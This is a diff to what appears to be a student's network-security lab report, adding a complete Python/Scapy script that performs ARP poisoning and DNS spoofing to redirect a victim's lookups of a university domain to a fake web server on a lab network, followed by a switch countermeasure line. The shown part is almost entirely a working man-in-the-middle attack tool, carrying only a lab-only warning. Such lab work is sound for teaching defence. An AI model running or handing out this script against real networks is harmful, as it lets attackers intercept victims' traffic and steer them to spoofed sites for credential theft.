@@ -126,14 +126,173 @@ show ip arp inspection vlan 10
 
 🐍 Script — HenryVicenteQuezada_2025-1332_dns_spoofing.py
 python
-#!/usr/bin/env python3
+ #!/usr/bin/env python3
 # =============================================================
 # Nombre:     Henry Vicente Quezada
 # Matricula:  2025-1332
 # Ataque:     DNS Spoofing + ARP Poisoning MitM
 # Fecha:      2026
 # =============================================================
-[PEGA AQUÍ EL SCRIPT COMPLETO]
+"""
+ADVERTENCIA: Solo para uso en entornos controlados y con
+autorización explícita. Laboratorio académico ITLA.
+
+Topología:
+  Víctima  : 10.13.32.X   (Windows VPC)
+  Atacante : 10.13.32.5   (Kali)
+  IP Falsa : 10.13.32.50  (servidor web falso, alias en Kali)
+  Gateway  : 10.13.32.1   (R1 - VLAN 10)
+
+Ejecución (como root):
+  sudo python3 HenryVicenteQuezada_2025-1332_dns_spoofing.py
+"""
+
+import sys
+import time
+import signal
+import threading
+from scapy.all import (
+    ARP, Ether, IP, UDP, DNS, DNSQR, DNSRR,
+    send, srp, sniff, get_if_hwaddr
+)
+
+# ─── Configuración de red ─────────────────────────────────
+IFACE        = "eth0"
+VICTIMA_IP   = "10.13.32.X"     # <-- AJUSTAR a la IP real del Windows
+ROUTER_IP    = "10.13.32.1"
+SERVIDOR_IP  = "10.13.32.50"    # IP falsa servida por Kali
+DOMINIO_FAKE = "itla.edu.do"
+TTL_FAKE     = 300
+ARP_INTERVAL = 2
+
+# ─── Obtener MACs ──────────────────────────────────────────
+def get_mac(ip: str) -> str:
+    arp_req = ARP(pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    pkt = broadcast / arp_req
+    ans, _ = srp(pkt, timeout=2, iface=IFACE, verbose=False)
+    if ans:
+        return ans[0][1].hwsrc
+    raise RuntimeError(f"[!] No se pudo obtener la MAC de {ip}")
+
+# ─── ARP Poisoning ──────────────────────────────────────────
+def arp_poison(target_ip, target_mac, spoof_ip):
+    pkt = ARP(
+        op=2,
+        pdst=target_ip,
+        hwdst=target_mac,
+        psrc=spoof_ip,
+        hwsrc=get_if_hwaddr(IFACE)
+    )
+    send(pkt, verbose=False)
+
+def restore_arp(target_ip, target_mac, source_ip, source_mac):
+    pkt = ARP(
+        op=2,
+        pdst=target_ip,
+        hwdst=target_mac,
+        psrc=source_ip,
+        hwsrc=source_mac
+    )
+    send(pkt, count=5, verbose=False)
+
+def arp_poison_loop(victima_mac, router_mac, stop_event):
+    print(f"[*] Iniciando ARP poisoning cada {ARP_INTERVAL}s...")
+    while not stop_event.is_set():
+        arp_poison(VICTIMA_IP, victima_mac, ROUTER_IP)
+        arp_poison(ROUTER_IP, router_mac, VICTIMA_IP)
+        time.sleep(ARP_INTERVAL)
+
+# ─── DNS Spoofing ───────────────────────────────────────────
+def dns_spoof_handler(pkt):
+    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
+        return
+
+    qname = pkt[DNS].qd.qname.decode().rstrip(".")
+    if DOMINIO_FAKE not in qname:
+        return
+
+    print(f"  [+] DNS query interceptada: {qname}  ->  respondiendo con {SERVIDOR_IP}")
+
+    dns_response = (
+        IP(src=pkt[IP].dst, dst=pkt[IP].src) /
+        UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
+        DNS(
+            id=pkt[DNS].id,
+            qr=1,
+            aa=1,
+            qd=pkt[DNS].qd,
+            an=DNSRR(
+                rrname=pkt[DNS].qd.qname,
+                type="A",
+                ttl=TTL_FAKE,
+                rdata=SERVIDOR_IP
+            )
+        )
+    )
+    send(dns_response, verbose=False, iface=IFACE)
+
+def start_dns_sniffer():
+    filtro_bpf = f"udp port 53 and src host {VICTIMA_IP}"
+    print(f"[*] Escuchando DNS queries de {VICTIMA_IP} (filtro: {filtro_bpf})")
+    sniff(iface=IFACE, filter=filtro_bpf, prn=dns_spoof_handler, store=0)
+
+# ─── IP Forwarding ───────────────────────────────────────────
+def enable_ip_forward():
+    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+        f.write("1")
+    print("[*] IP forwarding habilitado.")
+
+def disable_ip_forward():
+    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+        f.write("0")
+    print("[*] IP forwarding deshabilitado.")
+
+# ─── Main ────────────────────────────────────────────────────
+def main():
+    print("=" * 60)
+    print("  DNS Spoofing + ARP Poisoning - Henry Vicente Quezada 2025-1332")
+    print("=" * 60)
+
+    print(f"[*] Resolviendo MAC de la víctima ({VICTIMA_IP})...")
+    victima_mac = get_mac(VICTIMA_IP)
+    print(f"    -> {victima_mac}")
+
+    print(f"[*] Resolviendo MAC del gateway ({ROUTER_IP})...")
+    router_mac = get_mac(ROUTER_IP)
+    print(f"    -> {router_mac}")
+
+    enable_ip_forward()
+
+    stop_event = threading.Event()
+    arp_thread = threading.Thread(
+        target=arp_poison_loop,
+        args=(victima_mac, router_mac, stop_event),
+        daemon=True
+    )
+    arp_thread.start()
+
+    def shutdown(sig, frame):
+        print("\n[!] Deteniendo ataque y restaurando tablas ARP...")
+        stop_event.set()
+        restore_arp(VICTIMA_IP, victima_mac, ROUTER_IP, router_mac)
+        restore_arp(ROUTER_IP, router_mac, VICTIMA_IP, victima_mac)
+        disable_ip_forward()
+        print("[OK] Tablas ARP restauradas. Saliendo.")
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, shutdown)
+
+    print(f"\n[*] Objetivo DNS: {DOMINIO_FAKE} -> {SERVIDOR_IP}")
+    print("[*] Presiona Ctrl+C para detener y restaurar la red.\n")
+    start_dns_sniffer()
+
+
+if __name__ == "__main__":
+    if not sys.platform.startswith("linux"):
+        print("[!] Este script está diseñado para Linux.")
+        sys.exit(1)
+    main()
 
 🛡️ Contramedida aplicada
 SW1(config)# ip dhcp snooping
